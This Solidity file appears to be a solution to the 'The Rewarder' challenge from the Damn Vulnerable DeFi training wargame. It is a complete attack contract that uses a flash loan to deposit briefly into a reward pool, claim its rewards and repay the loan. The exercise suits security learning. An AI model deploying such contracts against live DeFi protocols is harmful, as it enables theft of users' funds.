// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract RewarderAttacker {

    DamnValuableToken public immutable damnValuableToken;
    FlashLoanerPool private immutable flashLoanpool;
    TheRewarderPool private immutable rewarderPool;
    RewardToken public immutable rewardToken;
    address public attacker;

    constructor (address tokenAddress, address flashLoanPoolAddress, address rewarderPoolAddress, address rewardTokenAddress, address attackerAddress) {
        damnValuableToken = DamnValuableToken(tokenAddress);
        flashLoanpool = FlashLoanerPool(flashLoanPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        attacker = attackerAddress;
    }

    function attack(uint256 amount) external {
        flashLoanpool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        damnValuableToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
        damnValuableToken.transfer(msg.sender, amount);
    }

    receive() external payable {}
}
